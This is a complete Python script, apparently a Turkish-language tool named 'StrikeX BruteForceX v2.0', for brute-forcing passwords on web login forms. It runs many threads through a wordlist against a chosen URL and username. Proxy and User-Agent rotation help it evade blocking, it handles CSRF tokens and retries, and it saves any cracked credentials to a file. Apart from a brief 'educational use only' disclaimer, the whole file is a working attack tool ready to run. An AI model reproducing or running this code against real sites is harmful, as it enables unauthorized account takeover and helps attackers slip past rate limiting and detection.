#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║              StrikeX — BruteForceX v2.0                     ║
║            Professional Web Login Brute Forcer              ║
║                  Educational Use Only                       ║
╚══════════════════════════════════════════════════════════════╝

Features:
  - Multi-threaded password cracking
  - Proxy support (HTTP/SOCKS) with rotation
  - Random User-Agent rotation
  - Session & CSRF token support
  - Timeout & retry mechanism
  - Progress bar with live statistics
  - Result logging to file
  - Rate limiting support
  - Colorful terminal UI

⚠️  DISCLAIMER: This tool is for educational & authorized testing only.
    Unauthorized access to systems is illegal. Use responsibly.
"""

import sys
import os
import re
import time
import signal
import random
import json
import argparse
import threading
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] 'requests' modülü gerekli: pip install requests")
    sys.exit(1)

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    print("[!] 'colorama' modülü gerekli: pip install colorama")
    sys.exit(1)


# ──────────────────────────────────────────────────────────────
# RENK TANIMLARI
# ──────────────────────────────────────────────────────────────
class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BRIGHT_RED = Fore.LIGHTRED_EX
    BRIGHT_GREEN = Fore.LIGHTGREEN_EX
    BRIGHT_CYAN = Fore.LIGHTCYAN_EX
    BRIGHT_YELLOW = Fore.LIGHTYELLOW_EX
    BRIGHT_MAGENTA = Fore.LIGHTMAGENTA_EX
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT
    DIM = Style.DIM


# ──────────────────────────────────────────────────────────────
# USER-AGENT LİSTESİ
# ──────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]


# ──────────────────────────────────────────────────────────────
# BANNER
# ──────────────────────────────────────────────────────────────
def print_banner():
    banner = f"""
{Colors.BRIGHT_RED}{Colors.BOLD}
    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗██╗  ██╗
    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝╚██╗██╔╝
    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗   ╚███╔╝
    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝   ██╔██╗
    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╔╝ ██╗
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
{Colors.RESET}
    {Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
    ║  {Colors.BRIGHT_YELLOW}⚡ StrikeX — BruteForceX v2.0 {Colors.BRIGHT_CYAN}│ {Colors.WHITE}Web Login Brute Forcer{Colors.BRIGHT_CYAN}              ║
    ║  {Colors.BRIGHT_MAGENTA}👤 Author: p0is0n3r {Colors.BRIGHT_CYAN}│ {Colors.WHITE}Educational & Authorized Testing Only{Colors.BRIGHT_CYAN}              ║
    ╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


# ──────────────────────────────────────────────────────────────
# YARDIMCI FONKSİYONLAR
# ──────────────────────────────────────────────────────────────
def log_message(msg, level="INFO"):
    """Renkli log mesajı yazdırır."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    level_colors = {
        "INFO": Colors.BRIGHT_CYAN,
        "SUCCESS": Colors.BRIGHT_GREEN,
        "WARNING": Colors.BRIGHT_YELLOW,
        "ERROR": Colors.BRIGHT_RED,
        "ATTEMPT": Colors.DIM + Colors.WHITE,
        "FOUND": Colors.BRIGHT_GREEN + Colors.BOLD,
    }
    color = level_colors.get(level, Colors.WHITE)
    icons = {
        "INFO": "ℹ️ ",
        "SUCCESS": "✅",
        "WARNING": "⚠️ ",
        "ERROR": "❌",
        "ATTEMPT": "🔑",
        "FOUND": "🎯",
    }
    icon = icons.get(level, "")
    print(f"  {Colors.DIM}[{timestamp}]{Colors.RESET} {color}{icon} {msg}{Colors.RESET}")


def format_time(seconds):
    """Süreyi okunabilir formata çevirir."""
    if seconds < 60:
        return f"{seconds:.1f}s"
    elif seconds < 3600:
        mins = int(seconds // 60)
        secs = int(seconds % 60)
        return f"{mins}m {secs}s"
    else:
        hours = int(seconds // 3600)
        mins = int((seconds % 3600) // 60)
        return f"{hours}h {mins}m"


def create_progress_bar(current, total, width=40):
    """İlerleme çubuğu oluşturur."""
    if total == 0:
        return ""
    percentage = current / total
    filled = int(width * percentage)
    bar = "█" * filled + "░" * (width - filled)
    pct_str = f"{percentage * 100:.1f}%"
    return f"{Colors.BRIGHT_CYAN}[{bar}]{Colors.RESET} {Colors.BRIGHT_YELLOW}{pct_str}{Colors.RESET}"


# ──────────────────────────────────────────────────────────────
# ANA BRUTEFORCE SINIFI
# ──────────────────────────────────────────────────────────────
class BruteForceX:
    """Profesyonel web login brute force aracı."""

    def __init__(self, config):
        self.url = config["url"]
        self.username = config["username"]
        self.password_file = config["password_file"]
        self.fail_string = config["fail_string"]
        self.success_string = config.get("success_string", "")
        self.cookie_value = config.get("cookie", "")
        self.proxy_file = config.get("proxy_file", "")
        self.threads = config.get("threads", 10)
        self.timeout = config.get("timeout", 10)
        self.max_retries = config.get("retries", 3)
        self.delay = config.get("delay", 0)
        self.method = config.get("method", "POST").upper()
        self.csrf_field = config.get("csrf_field", "")
        self.csrf_url = config.get("csrf_url", "")
        self.username_field = config.get("username_field", "username")
        self.password_field = config.get("password_field", "password")
        self.extra_data = config.get("extra_data", {})
        self.output_file = config.get("output", "")
        self.verbose = config.get("verbose", False)

        # İç state
        self.passwords = []
        self.proxies = []
        self.found = False
        self.found_password = None
        self.lock = threading.Lock()
        self.total_attempts = 0
        self.failed_attempts = 0
        self.error_count = 0
        self.start_time = None
        self.total_passwords = 0

        # İstatistikler
        self.stats = {
            "total_tried": 0,
            "errors": 0,
            "retries": 0,
            "start_time": None,
            "end_time": None,
        }

    # ─── YÜKLEME ──────────────────────────────────────────────

    def load_passwords(self):
        """Şifre dosyasını yükler."""
        if not os.path.isfile(self.password_file):
            log_message(f"Şifre dosyası bulunamadı: {self.password_file}", "ERROR")
            sys.exit(1)

        try:
            with open(self.password_file, "r", encoding="utf-8", errors="ignore") as f:
                self.passwords = [
                    line.strip() for line in f if line.strip()
                ]
            self.total_passwords = len(self.passwords)
            log_message(f"{self.total_passwords:,} adet şifre yüklendi", "INFO")
        except Exception as e:
            log_message(f"Şifre dosyası okunamadı: {e}", "ERROR")
            sys.exit(1)

    def load_proxies(self):
        """Proxy dosyasını yükler (opsiyonel)."""
        if not self.proxy_file:
            return

        if not os.path.isfile(self.proxy_file):
            log_message(f"Proxy dosyası bulunamadı: {self.proxy_file}", "WARNING")
            return

        try:
            with open(self.proxy_file, "r", encoding="utf-8") as f:
                self.proxies = [
                    line.strip() for line in f if line.strip()
                ]
            log_message(f"{len(self.proxies)} adet proxy yüklendi", "INFO")
        except Exception as e:
            log_message(f"Proxy dosyası okunamadı: {e}", "WARNING")

    # ─── SESSION YÖNETİMİ ────────────────────────────────────

    def create_session(self):
        """Retry mekanizmalı bir requests session oluşturur."""
        session = requests.Session()

        # Retry stratejisi
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "OPTIONS"],
        )
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=self.threads,
            pool_maxsize=self.threads,
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        # User-Agent ayarla
        session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        })

        # Cookie varsa ekle
        if self.cookie_value:
            for cookie_pair in self.cookie_value.split(";"):
                cookie_pair = cookie_pair.strip()
                if "=" in cookie_pair:
                    key, val = cookie_pair.split("=", 1)
                    session.cookies.set(key.strip(), val.strip())

        return session

    def get_random_proxy(self):
        """Rastgele bir proxy döndürür."""
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        if not proxy.startswith(("http://", "https://", "socks")):
            proxy = f"http://{proxy}"
        return {"http": proxy, "https": proxy}

    def fetch_csrf_token(self, session):
        """CSRF token'ını sayfadan çeker."""
        if not self.csrf_field:
            return None

        target_url = self.csrf_url if self.csrf_url else self.url
        try:
            resp = session.get(target_url, timeout=self.timeout)
            # Basit regex ile token çekme
            patterns = [
                rf'name=["\']?{re.escape(self.csrf_field)}["\']?\s+value=["\']?([^"\'>\s]+)',
                rf'value=["\']?([^"\'>\s]+)["\']?\s+name=["\']?{re.escape(self.csrf_field)}',
                rf'name="{re.escape(self.csrf_field)}"\s+content="([^"]+)"',
            ]
            for pattern in patterns:
                match = re.search(pattern, resp.text, re.IGNORECASE)
                if match:
                    return match.group(1)

            log_message(f"CSRF token bulunamadı: '{self.csrf_field}'", "WARNING")
            return None
        except Exception as e:
            log_message(f"CSRF token alınamadı: {e}", "ERROR")
            return None

    # ─── SALDIRI LOJİĞİ ──────────────────────────────────────

    def try_password(self, password, session):
        """Tek bir şifreyi dener."""
        if self.found:
            return False

        # User-Agent'ı her istekte değiştir
        session.headers["User-Agent"] = random.choice(USER_AGENTS)

        # Veri hazırla
        data = {
            self.username_field: self.username,
            self.password_field: password,
        }
        data.update(self.extra_data)

        # CSRF token ekle
        if self.csrf_field:
            token = self.fetch_csrf_token(session)
            if token:
                data[self.csrf_field] = token

        # Proxy ayarla
        proxies = self.get_random_proxy()

        try:
            if self.method == "GET":
                response = session.get(
                    self.url,
                    params=data,
                    timeout=self.timeout,
                    proxies=proxies,
                    allow_redirects=True,
                )
            else:
                response = session.post(
                    self.url,
                    data=data,
                    timeout=self.timeout,
                    proxies=proxies,
                    allow_redirects=True,
                )

            content = response.text

            # Başarı kontrolü
            found = False
            if self.success_string:
                found = self.success_string in content
            else:
                found = self.fail_string not in content

            with self.lock:
                self.total_attempts += 1
                self.stats["total_tried"] += 1

            if found:
                with self.lock:
                    if not self.found:
                        self.found = True
                        self.found_password = password
                return True
            else:
                if self.verbose:
                    with self.lock:
                        self.failed_attempts += 1
                return False

        except requests.exceptions.ProxyError:
            with self.lock:
                self.error_count += 1
                self.stats["errors"] += 1
            if self.verbose:
                log_message(f"Proxy hatası: {password}", "WARNING")
            return False

        except requests.exceptions.Timeout:
            with self.lock:
                self.error_count += 1
                self.stats["errors"] += 1
            if self.verbose:
                log_message(f"Timeout: {password}", "WARNING")
            return False

        except requests.exceptions.ConnectionError:
            with self.lock:
                self.error_count += 1
                self.stats["errors"] += 1
            if self.verbose:
                log_message(f"Bağlantı hatası: {password}", "ERROR")
            return False

        except Exception as e:
            with self.lock:
                self.error_count += 1
                self.stats["errors"] += 1
            if self.verbose:
                log_message(f"Beklenmeyen hata ({password}): {e}", "ERROR")
            return False

    # ─── İLERLEME GÖSTERGESI ──────────────────────────────────

    def progress_monitor(self):
        """Arka planda ilerleme bilgisi gösterir."""
        while not self.found and self.total_attempts < self.total_passwords:
            time.sleep(1)
            if self.found:
                break

            elapsed = time.time() - self.start_time
            speed = self.total_attempts / elapsed if elapsed > 0 else 0
            remaining = self.total_passwords - self.total_attempts
            eta = remaining / speed if speed > 0 else 0

            bar = create_progress_bar(self.total_attempts, self.total_passwords, 30)
            status = (
                f"\r  {bar} "
                f"{Colors.WHITE}{self.total_attempts:,}/{self.total_passwords:,} "
                f"{Colors.BRIGHT_CYAN}⚡ {speed:.0f}/sn "
                f"{Colors.BRIGHT_YELLOW}⏱️  ETA: {format_time(eta)} "
                f"{Colors.BRIGHT_RED}❌ {self.error_count} hata"
                f"{Colors.RESET}    "
            )
            sys.stdout.write(status)
            sys.stdout.flush()

    # ─── ANA SALDIRI ──────────────────────────────────────────

    def run(self):
        """Ana brute force saldırısını başlatır."""
        self.load_passwords()
        self.load_proxies()

        if not self.passwords:
            log_message("Şifre listesi boş!", "ERROR")
            sys.exit(1)

        # Hedef bilgilerini göster
        self._print_target_info()

        self.start_time = time.time()
        self.stats["start_time"] = datetime.now()

        log_message("Saldırı başlatılıyor...", "INFO")
        print()

        # İlerleme thread'i
        progress_thread = threading.Thread(target=self.progress_monitor, daemon=True)
        progress_thread.start()

        # Multi-threaded saldırı
        session = self.create_session()

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {}
                for password in self.passwords:
                    if self.found:
                        break

                    # Rate limiting
                    if self.delay > 0:
                        time.sleep(self.delay)

                    future = executor.submit(self.try_password, password, session)
                    futures[future] = password

                for future in as_completed(futures):
                    if self.found:
                        # Kalan future'ları iptal et
                        for f in futures:
                            f.cancel()
                        break

        except KeyboardInterrupt:
            print(f"\n\n  {Colors.BRIGHT_YELLOW}⚠️  Kullanıcı tarafından durduruldu!{Colors.RESET}")

        # İlerleme satırını temizle
        sys.stdout.write("\r" + " " * 120 + "\r")
        sys.stdout.flush()

        elapsed = time.time() - self.start_time
        self.stats["end_time"] = datetime.now()

        # Sonuçları göster
        print()
        self._print_results(elapsed)

        # Dosyaya kaydet
        if self.found and self.output_file:
            self._save_results()

    # ─── BİLGİ GÖSTERİMİ ─────────────────────────────────────

    def _print_target_info(self):
        """Hedef bilgilerini güzel formatta gösterir."""
        print(f"\n  {Colors.BRIGHT_CYAN}{'═' * 60}{Colors.RESET}")
        print(f"  {Colors.BOLD}{Colors.BRIGHT_YELLOW}  📋 HEDEF BİLGİLERİ{Colors.RESET}")
        print(f"  {Colors.BRIGHT_CYAN}{'═' * 60}{Colors.RESET}")

        parsed = urlparse(self.url)
        items = [
            ("🌐 Hedef URL", self.url),
            ("🏠 Host", parsed.hostname or "N/A"),
            ("👤 Kullanıcı", self.username),
            ("📁 Şifre Dosyası", os.path.basename(self.password_file)),
            ("🔢 Toplam Şifre", f"{self.total_passwords:,}"),
            ("🧵 Thread Sayısı", str(self.threads)),
            ("⏱️  Timeout", f"{self.timeout}s"),
            ("🔄 Max Retry", str(self.max_retries)),
            ("📡 Metod", self.method),
        ]

        if self.delay > 0:
            items.append(("⏳ Gecikme", f"{self.delay}s"))
        if self.proxies:
            items.append(("🛡️  Proxy Sayısı", str(len(self.proxies))))
        if self.csrf_field:
            items.append(("🔐 CSRF Field", self.csrf_field))

        for label, value in items:
            print(f"  {Colors.WHITE}  {label:<20}{Colors.RESET}: {Colors.BRIGHT_GREEN}{value}{Colors.RESET}")

        print(f"  {Colors.BRIGHT_CYAN}{'═' * 60}{Colors.RESET}\n")

    def _print_results(self, elapsed):
        """Sonuçları detaylı tablo halinde gösterir."""
        speed = self.total_attempts / elapsed if elapsed > 0 else 0

        print(f"  {Colors.BRIGHT_CYAN}{'═' * 60}{Colors.RESET}")
        print(f"  {Colors.BOLD}{Colors.BRIGHT_YELLOW}  📊 SONUÇ RAPORU{Colors.RESET}")
        print(f"  {Colors.BRIGHT_CYAN}{'═' * 60}{Colors.RESET}")

        if self.found:
            print(f"""
  {Colors.BRIGHT_GREEN}{Colors.BOLD}  ██████████████████████████████████████████████████████{Colors.RESET}
  {Colors.BRIGHT_GREEN}{Colors.BOLD}  ██                                                ████{Colors.RESET}
  {Colors.BRIGHT_GREEN}{Colors.BOLD}  ██   🎯 ŞİFRE BULUNDU!                            ████{Colors.RESET}
  {Colors.BRIGHT_GREEN}{Colors.BOLD}  ██                                                ████{Colors.RESET}
  {Colors.BRIGHT_GREEN}{Colors.BOLD}  ██   👤 Kullanıcı : {self.username:<30}████{Colors.RESET}
  {Colors.BRIGHT_GREEN}{Colors.BOLD}  ██   🔑 Şifre     : {self.found_password:<30}████{Colors.RESET}
  {Colors.BRIGHT_GREEN}{Colors.BOLD}  ██                                                ████{Colors.RESET}
  {Colors.BRIGHT_GREEN}{Colors.BOLD}  ██████████████████████████████████████████████████████{Colors.RESET}
""")
        else:
            print(f"\n  {Colors.BRIGHT_RED}{Colors.BOLD}  ❌ Şifre bulunamadı! Listedeki hiçbir şifre eşleşmedi.{Colors.RESET}\n")

        # İstatistik tablosu
        stats_items = [
            ("⏱️  Toplam Süre", format_time(elapsed)),
            ("🔢 Denenen Şifre", f"{self.total_attempts:,}"),
            ("⚡ Hız", f"{speed:.1f} deneme/sn"),
            ("❌ Hata Sayısı", str(self.error_count)),
            ("🧵 Thread Sayısı", str(self.threads)),
        ]

        for label, value in stats_items:
            print(f"  {Colors.WHITE}  {label:<20}{Colors.RESET}: {Colors.BRIGHT_CYAN}{value}{Colors.RESET}")

        print(f"\n  {Colors.BRIGHT_CYAN}{'═' * 60}{Colors.RESET}\n")

    def _save_results(self):
        """Sonuçları dosyaya kaydeder."""
        try:
            result = {
                "timestamp": datetime.now().isoformat(),
                "target_url": self.url,
                "username": self.username,
                "password": self.found_password,
                "attempts": self.total_attempts,
                "elapsed_time": format_time(time.time() - self.start_time),
                "errors": self.error_count,
                "threads": self.threads,
            }

            # JSON olarak kaydet
            with open(self.output_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(result, indent=2, ensure_ascii=False) + "\n\n")

            log_message(f"Sonuçlar kaydedildi: {self.output_file}", "SUCCESS")

        except Exception as e:
            log_message(f"Sonuçlar kaydedilemedi: {e}", "ERROR")


# ──────────────────────────────────────────────────────────────
# İNTERAKTİF MOD
# ──────────────────────────────────────────────────────────────
def interactive_mode():
    """Kullanıcıdan interaktif olarak bilgi alır."""
    print(f"\n  {Colors.BRIGHT_CYAN}{'═' * 60}{Colors.RESET}")
    print(f"  {Colors.BOLD}{Colors.BRIGHT_YELLOW}  ⚙️  İNTERAKTİF YAPILANDIRMA{Colors.RESET}")
    print(f"  {Colors.BRIGHT_CYAN}{'═' * 60}{Colors.RESET}\n")

    def ask(prompt, default="", required=True):
        while True:
            if default:
                value = input(f"  {Colors.BRIGHT_CYAN}➤ {Colors.WHITE}{prompt} {Colors.DIM}[{default}]{Colors.RESET}: ").strip()
                if not value:
                    value = default
            else:
                value = input(f"  {Colors.BRIGHT_CYAN}➤ {Colors.WHITE}{prompt}{Colors.RESET}: ").strip()

            if value or not required:
                return value
            print(f"    {Colors.BRIGHT_RED}Bu alan zorunludur!{Colors.RESET}")

    config = {}
    config["url"] = ask("Hedef URL")
    config["username"] = ask("Kullanıcı Adı")
    config["password_file"] = ask("Şifre Dosyası Yolu")
    config["fail_string"] = ask("Başarısız Giriş Mesajı (sayfada görünen)")

    # Opsiyonel ayarlar
    print(f"\n  {Colors.BRIGHT_YELLOW}── Opsiyonel Ayarlar (boş bırakabilirsiniz) ──{Colors.RESET}\n")

    config["success_string"] = ask("Başarılı Giriş Mesajı", required=False)
    config["cookie"] = ask("Cookie Değeri (key=value;key2=value2)", required=False)
    config["method"] = ask("HTTP Metodu", default="POST", required=False)
    config["threads"] = int(ask("Thread Sayısı", default="10", required=False) or 10)
    config["timeout"] = int(ask("Timeout (saniye)", default="10", required=False) or 10)
    config["retries"] = int(ask("Max Retry", default="3", required=False) or 3)
    config["delay"] = float(ask("İstekler Arası Gecikme (saniye)", default="0", required=False) or 0)
    config["proxy_file"] = ask("Proxy Dosyası Yolu", required=False)
    config["csrf_field"] = ask("CSRF Token Alan Adı", required=False)
    config["csrf_url"] = ask("CSRF Token URL (boş = hedef URL)", required=False)
    config["username_field"] = ask("Kullanıcı Adı Alan Adı", default="username", required=False) or "username"
    config["password_field"] = ask("Şifre Alan Adı", default="password", required=False) or "password"
    config["output"] = ask("Sonuç Dosyası Yolu", default="results.json", required=False) or "results.json"
    config["verbose"] = ask("Detaylı Çıktı (e/h)", default="h", required=False).lower() in ("e", "evet", "y", "yes")

    # Extra data
    extra = ask("Ek Form Verisi (key=value,key2=value2)", required=False)
    if extra:
        config["extra_data"] = {}
        for pair in extra.split(","):
            if "=" in pair:
                k, v = pair.strip().split("=", 1)
                config["extra_data"][k.strip()] = v.strip()

    return config


# ──────────────────────────────────────────────────────────────
# ARGPARSE YAPILANDIRMASI
# ──────────────────────────────────────────────────────────────
def parse_arguments():
    """Komut satırı argümanlarını parse eder."""
    parser = argparse.ArgumentParser(
        description="StrikeX — BruteForceX v2.0 - Professional Web Login Brute Forcer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Örnekler:
  %(prog)s -u http://target.com/login -n admin -w passwords.txt -f "Invalid"
  %(prog)s -u http://target.com/login -n admin -w passwords.txt -f "Invalid" -t 20 --proxy proxies.txt
  %(prog)s -u http://target.com/login -n admin -w passwords.txt -s "Welcome" --csrf csrf_token
  %(prog)s   (interaktif mod)
        """,
    )

    parser.add_argument("-u", "--url", help="Hedef login URL")
    parser.add_argument("-n", "--username", help="Brute force yapılacak kullanıcı adı")
    parser.add_argument("-w", "--wordlist", help="Şifre dosyası yolu")
    parser.add_argument("-f", "--fail-string", help="Başarısız giriş mesajı")
    parser.add_argument("-s", "--success-string", help="Başarılı giriş mesajı (opsiyonel)", default="")
    parser.add_argument("-c", "--cookie", help="Cookie değeri (key=value;key2=value2)", default="")
    parser.add_argument("-m", "--method", help="HTTP Metodu (GET/POST)", default="POST", choices=["GET", "POST"])
    parser.add_argument("-t", "--threads", help="Thread sayısı", type=int, default=10)
    parser.add_argument("--timeout", help="Timeout (saniye)", type=int, default=10)
    parser.add_argument("--retries", help="Max retry sayısı", type=int, default=3)
    parser.add_argument("--delay", help="İstekler arası gecikme (saniye)", type=float, default=0)
    parser.add_argument("--proxy", help="Proxy dosyası yolu", default="")
    parser.add_argument("--csrf", help="CSRF token alan adı", default="")
    parser.add_argument("--csrf-url", help="CSRF token URL", default="")
    parser.add_argument("--user-field", help="Kullanıcı adı form alan adı", default="username")
    parser.add_argument("--pass-field", help="Şifre form alan adı", default="password")
    parser.add_argument("--extra-data", help="Ek form verisi (key=value,key2=value2)", default="")
    parser.add_argument("-o", "--output", help="Sonuç dosyası yolu", default="results.json")
    parser.add_argument("-v", "--verbose", help="Detaylı çıktı", action="store_true")

    return parser.parse_args()


# ──────────────────────────────────────────────────────────────
# ANA GİRİŞ NOKTASI
# ──────────────────────────────────────────────────────────────
def main():
    """Ana giriş noktası."""
    # Ctrl+C sinyalini yakala
    signal.signal(signal.SIGINT, lambda s, f: (
        print(f"\n\n  {Colors.BRIGHT_YELLOW}⚠️  Program sonlandırılıyor...{Colors.RESET}\n"),
        sys.exit(0),
    ))

    print_banner()

    args = parse_arguments()

    # Eğer gerekli argümanlar verilmemişse interaktif moda geç
    if not all([args.url, args.username, args.wordlist, args.fail_string]) and not args.success_string:
        config = interactive_mode()
    else:
        config = {
            "url": args.url,
            "username": args.username,
            "password_file": args.wordlist,
            "fail_string": args.fail_string or "",
            "success_string": args.success_string,
            "cookie": args.cookie,
            "method": args.method,
            "threads": args.threads,
            "timeout": args.timeout,
            "retries": args.retries,
            "delay": args.delay,
            "proxy_file": args.proxy,
            "csrf_field": args.csrf,
            "csrf_url": args.csrf_url,
            "username_field": args.user_field,
            "password_field": args.pass_field,
            "output": args.output,
            "verbose": args.verbose,
            "extra_data": {},
        }

        # Extra data parse
        if args.extra_data:
            for pair in args.extra_data.split(","):
                if "=" in pair:
                    k, v = pair.strip().split("=", 1)
                    config["extra_data"][k.strip()] = v.strip()

    # Saldırıyı başlat
    bruter = BruteForceX(config)
    bruter.run()


if __name__ == "__main__":
    main()
